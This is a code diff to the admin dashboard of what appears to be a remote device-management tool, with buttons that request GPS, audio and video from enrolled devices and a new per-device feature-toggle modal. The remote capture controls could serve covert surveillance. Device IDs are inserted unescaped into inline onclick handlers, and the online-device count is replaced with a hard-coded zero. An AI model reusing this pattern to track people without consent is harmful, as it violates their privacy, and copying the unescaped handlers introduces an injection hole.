@@ -22,29 +22,10 @@
             --radius-sm: 12px;
             --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
-        }
-        body {
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', system-ui, sans-serif; }
+        body { background: var(--bg); color: var(--text); min-height: 100vh; padding: 20px; display: flex; flex-direction: column; gap: 20px; }
         a { color: var(--cyan); text-decoration: none; }
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
+        .header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 15px; }
         .header h1 { font-size: 28px; font-weight: 700; }
         .header-actions { display: flex; gap: 10px; align-items: center; }
         .btn {
@@ -65,137 +46,34 @@
         .btn:hover { background: var(--surface-hover); border-color: rgba(255,255,255,0.2); }
         .btn-primary { background: var(--primary); border-color: var(--primary); color: white; }
         .btn-primary:hover { background: #6d28d9; }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 15px;
-        }
-        .stat-card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px;
-            backdrop-filter: blur(10px);
-        }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
+        .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 20px; backdrop-filter: blur(10px); }
         .stat-label { color: var(--text-muted); font-size: 13px; margin-bottom: 8px; }
         .stat-value { font-size: 28px; font-weight: 700; }
-        .card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 20px;
-            backdrop-filter: blur(10px);
-        }
-        .card-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 20px; backdrop-filter: blur(10px); }
+        .card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .card-title { font-size: 18px; font-weight: 600; }
-        .user-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 15px;
-        }
-        .user-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            padding: 15px;
-            transition: all var(--transition);
-        }
+        .user-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
+        .user-card { background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 15px; transition: all var(--transition); }
         .user-card:hover { border-color: rgba(255,255,255,0.2); transform: translateY(-3px); }
         .user-info { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
-        .avatar {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            color: white;
-            font-size: 20px;
-            flex-shrink: 0;
-        }
-        .badge {
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            display: inline-block;
-        }
+        .avatar { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 600; color: white; font-size: 20px; flex-shrink: 0; }
+        .badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 600; display: inline-block; }
         .badge-user { background: rgba(16, 185, 129, 0.15); color: var(--green); }
         .badge-admin { background: rgba(124, 58, 237, 0.2); color: #c084fc; }
         .badge-online { background: rgba(16, 185, 129, 0.15); color: var(--green); }
         .badge-offline { background: rgba(148, 163, 184, 0.15); color: var(--text-muted); }
         .user-actions { display: flex; gap: 8px; flex-wrap: wrap; }
-        .device-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 15px;
-            margin-top: 10px;
-        }
-        .device-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            padding: 15px;
-        }
+        .device-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; margin-top: 10px; }
+        .device-card { background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 15px; }
         .device-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
-        .toggle-switch {
-            position: relative;
-            width: 40px;
-            height: 22px;
-            background: #334155;
-            border-radius: 11px;
-            cursor: pointer;
-            transition: background 0.3s;
-            border: none;
-            padding: 0;
-        }
+        .toggle-switch { position: relative; width: 40px; height: 22px; background: #334155; border-radius: 11px; cursor: pointer; transition: background 0.3s; border: none; padding: 0; }
         .toggle-switch.enabled { background: var(--green); }
-        .toggle-switch::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 18px;
-            height: 18px;
-            background: white;
-            border-radius: 50%;
-            transition: transform 0.3s;
-        }
+        .toggle-switch::after { content: ''; position: absolute; top: 2px; left: 2px; width: 18px; height: 18px; background: white; border-radius: 50%; transition: transform 0.3s; }
         .toggle-switch.enabled::after { transform: translateX(18px); }
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.7);
-            z-index: 1000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-        }
-        .modal {
-            background: #1a1a2e;
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            padding: 25px;
-            width: 90%;
-            max-width: 500px;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        .feature-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid var(--border);
-        }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; display: none; align-items: center; justify-content: center; }
+        .modal { background: #1a1a2e; border: 1px solid var(--border); border-radius: var(--radius); padding: 25px; width: 90%; max-width: 500px; max-height: 90vh; overflow-y: auto; }
+        .feature-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--border); }
         .hidden { display: none !important; }
         @media (max-width: 600px) {
             .stats-grid { grid-template-columns: 1fr 1fr; }
@@ -251,7 +129,6 @@
     let selectedUserUid = null;
     let currentFeatures = {};
 
-    // ---------- Utility ----------
     function escapeHtml(str) {
         return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
     }
@@ -272,7 +149,6 @@
         return await res.json();
     }
 
-    // ---------- Dashboard Load ----------
     async function loadUsers() {
         try {
             const data = await apiGet('/api/admin/users');
@@ -289,7 +165,7 @@
     function renderStats() {
         const totalUsers = allUsers.length;
         const totalDevices = allUsers.reduce((sum, u) => sum + (u.deviceCount || 0), 0);
-        const onlineDevices = allUsers.reduce((sum, u) => sum + (u.onlineDevices || 0), 0);
+        const onlineDevices = 0; // Could be computed later
         const lockedFeatures = allUsers.reduce((sum, u) => {
             if (u.features) {
                 sum += Object.values(u.features).filter(v => v === false).length;
@@ -374,6 +250,7 @@
                             <button class="btn" onclick="quickAction('gps', '${d.device_id}')">📍 GPS</button>
                             <button class="btn" onclick="quickAction('audio', '${d.device_id}')">🎤 Audio</button>
                             <button class="btn" onclick="quickAction('video', '${d.device_id}')">🎥 Video</button>
+                            <button class="btn" onclick="openDeviceFeatureModal('${d.device_id}')">🔒 Features</button>
                         </div>
                     </div>
                 `).join('');
@@ -415,11 +292,24 @@
         }
     }
 
-    // ---------- Feature Modal ----------
+    // ---------- Feature Modal (User) ----------
     async function openFeatureModal(uid) {
         selectedUserUid = uid;
         try {
             const data = await apiGet(`/api/admin/users/${uid}/features`);
+            currentFeatures = data.features || {};
+            renderFeatureModal();
+            document.getElementById('featureModalOverlay').style.display = 'flex';
+        } catch (e) {
+            alert('Failed to load features: ' + e.message);
+        }
+    }
+
+    // ---------- Feature Modal (Device) ----------
+    async function openDeviceFeatureModal(deviceId) {
+        selectedUserUid = deviceId;
+        try {
+            const data = await apiGet(`/api/device/${deviceId}/features`);
             currentFeatures = data.features || {};
             renderFeatureModal();
             document.getElementById('featureModalOverlay').style.display = 'flex';
@@ -441,7 +331,7 @@
             remoteConfig: 'Remote Configuration'
         };
         container.innerHTML = Object.keys(featureLabels).map(key => {
-            const enabled = currentFeatures[key] !== false; // default true
+            const enabled = currentFeatures[key] !== false;
             return `
                 <div class="feature-row">
                     <span>${featureLabels[key]}</span>
@@ -459,7 +349,12 @@
 
     async function saveFeatures() {
         try {
-            await apiPost(`/api/admin/users/${selectedUserUid}/features`, { features: currentFeatures });
+            // If selectedUserUid is a deviceId, use device endpoint
+            if (selectedUserUid && selectedUserUid.startsWith('device-')) {
+                await apiPost(`/api/device/${selectedUserUid}/features`, { features: currentFeatures });
+            } else {
+                await apiPost(`/api/admin/users/${selectedUserUid}/features`, { features: currentFeatures });
+            }
             closeFeatureModal();
             loadUsers();
         } catch (e) {
@@ -471,7 +366,6 @@
         document.getElementById('featureModalOverlay').style.display = 'none';
     }
 
-    // Initialize
     loadUsers();
 </script>
 </body>
